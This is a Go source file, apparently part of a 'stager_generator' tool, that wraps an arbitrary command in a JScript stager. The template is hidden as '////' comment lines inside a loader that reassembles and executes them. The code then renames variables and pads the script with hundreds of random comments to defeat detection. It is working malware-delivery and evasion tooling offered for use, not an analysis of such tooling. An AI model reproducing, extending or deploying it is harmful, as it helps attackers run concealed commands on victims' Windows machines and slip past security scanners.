package jsobfuscation1

import (
    "fmt"
    "os"
    "log"
    "strings"
    "bufio"
    
    "stager_generator/utils"
)

const (
    TEMPLATE_PATH = "./jsobfuscation1"
    TEMPLATE_JS_FILE = TEMPLATE_PATH + "/template.js"
    LOADER_JS_FILE = TEMPLATE_PATH + "/loader.js"
)

/*
Description:

- Inserts comamnd into "template.js" JScript file.
- "template.js" content is embedded into loader.js as comments (Prefix: "////")
- "loader.js" will find comments start with "////", regroup it and execute as JScript.

*/

func JsObfuscation1(command string) string {
    fmt.Println("[*] Starting JScript Obfuscation 1.")

    originalTemplateFile := TEMPLATE_JS_FILE
    originalTemplateScript, err := os.ReadFile(originalTemplateFile)
    if err != nil {
        log.Fatal(err)
    }

    escaped_command := utils.EscapeJScriptString(command)

    // Replacing placeholder "INSERT_CMDLINE"
    newScript := strings.ReplaceAll(string(originalTemplateScript), "INSERT_CMDLINE", escaped_command)

    // Adding "////" to comment out final JScript
    var templateScriptSlice []string
    
    scanner := bufio.NewScanner(strings.NewReader(newScript))
    for scanner.Scan(){
        templateScriptSlice = append(templateScriptSlice, "////" + scanner.Text())
    }

    // Reading loader script
    originalLoaderFile := LOADER_JS_FILE
    originalLoaderScript, err := os.Open(originalLoaderFile)
    if err != nil {
        log.Fatal(err)
    }

    var loaderScriptSlice []string

    scanner = bufio.NewScanner(originalLoaderScript)
    for scanner.Scan(){
        loaderScriptSlice = append(loaderScriptSlice, scanner.Text())
    }

    // Combining the loader and tempalte JScript
    resultSlice := utils.InsertRandomly(templateScriptSlice, loaderScriptSlice)

    // Renaming all variables
    resultSlice = utils.RenameJScriptVairables(resultSlice, utils.WORDLIST_LARGE)

    numWords := utils.RandRange(40, 60)

    numComments := utils.RandRange(800, 1000)

    resultSlice, err = utils.InsertRandomComments(resultSlice, utils.WORDLIST_LARGE, numWords, numComments)

    if err != nil {
        fmt.Println(err)
    }

    resultString := utils.SliceToString(resultSlice)

    fmt.Println("[+] JScript Obfuscation 1 completed.")

    return resultString
}